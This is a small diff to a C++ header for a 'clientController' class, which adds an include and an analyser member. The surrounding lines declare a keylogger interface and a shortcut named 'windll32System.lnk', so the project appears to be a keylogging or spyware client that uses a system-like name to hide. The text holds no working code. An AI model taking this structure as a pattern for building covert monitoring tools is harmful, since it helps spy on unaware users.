@@ -24,6 +24,7 @@
 # include "WorkQueue.h"
 # include "sayHello.h"
 # include "DataHandler.h"
+# include "Context.h"
 
 
 # define SHORTCUT_NAME			L"\\windll32System.lnk"
@@ -44,6 +45,7 @@ class	clientController {
 	_I_InfoClient	*infoClient;
 	IDataHandler	*dataHandler;
 	IKeylogger		*keyLogger;
+	IAnalyser		*analyser;
 
 	// Params
 	bool			quit;
